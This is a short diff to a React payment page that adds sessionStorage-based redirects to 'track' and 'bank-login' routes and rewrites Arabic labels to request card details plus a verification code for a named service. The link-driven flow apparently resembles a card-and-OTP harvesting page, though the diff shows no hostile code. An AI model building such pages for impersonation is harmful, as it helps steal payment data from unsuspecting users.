@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -19,6 +19,17 @@ const PaymentCardInput = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: linkData } = useLink(id);
+  
+  useEffect(() => {
+    const method = sessionStorage.getItem('paymentMethod');
+    if (!method) {
+      navigate(`/pay/${id}/track`);
+      return;
+    }
+    if (method !== 'card') {
+      navigate(`/pay/${id}/bank-login`);
+    }
+  }, [id, navigate]);
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
@@ -207,8 +218,8 @@ const PaymentCardInput = () => {
       serviceName={serviceName}
       serviceKey={serviceKey}
       amount={formattedAmount}
-      title="بيانات البطاقة"
-      description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
+      title="تفاصيل الدفع"
+      description={`أدخل بيانات البطاقة لخدمة ${serviceName} مع تأكيد عبر رمز التحقق`}
       icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
     >
       {/* Selected Bank/Country Info */}
